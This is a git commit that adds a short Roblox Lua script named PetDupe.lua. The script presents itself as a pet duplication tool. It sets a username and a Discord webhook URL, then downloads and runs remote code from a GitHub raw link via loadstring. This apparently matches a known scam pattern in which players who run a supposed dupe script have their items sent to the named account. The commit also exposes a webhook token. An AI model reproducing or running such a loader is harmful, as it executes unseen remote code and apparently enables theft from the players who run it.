339783d995e5b23b00787b102890c03f4b6963dd
PsxJoey <131613702+PsxJoey@users.noreply.github.com>
2023-04-23 20:18:39 +0200

    Create PetDupe.lua

---
+++ PetDupe.lua
@@ -0,0 +1,5 @@
+_G.Username = "Joey1510YT"
+_G.HubName = "PetDupe"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1099759759659368448/VKr1h2TGAcizZaLnZT_erb0GYovhVx8LOvPagwDXlfX3FlbIiRdrgLi7usmXJcCeR4FF"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))() 
